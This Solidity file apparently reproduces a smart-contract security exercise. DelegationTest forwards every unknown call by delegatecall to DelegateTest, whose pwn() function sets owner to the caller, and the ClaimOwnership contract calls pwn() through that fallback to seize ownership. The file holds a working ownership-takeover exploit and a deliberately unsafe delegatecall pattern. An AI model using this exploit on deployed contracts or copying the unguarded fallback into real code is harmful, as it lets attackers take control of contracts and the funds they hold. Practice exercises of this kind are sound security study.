// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

contract ClaimOwnership {
    address hackMe;
    
    constructor(address _hackMe) public {
        hackMe = _hackMe;
    }
    
    function call() public returns (bool) {
        bytes memory payload = abi.encodeWithSignature("pwn()");
        
        (bool success,) = hackMe.call(payload);
        
        require(success);
    }
}

contract DelegateTest {
    address public owner;
    
    constructor(address _owner) public {
        owner = _owner;
    }
    
    function pwn() public {
        owner = msg.sender;
    }
}

contract DelegationTest {
    address public owner;
    DelegateTest delegateTest;
    
    constructor(address _delegateTestAddress) public {
        delegateTest = DelegateTest(_delegateTestAddress);
        owner = msg.sender;
    }
    
    fallback() external {
        (bool result, bytes memory data) = address(delegateTest).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}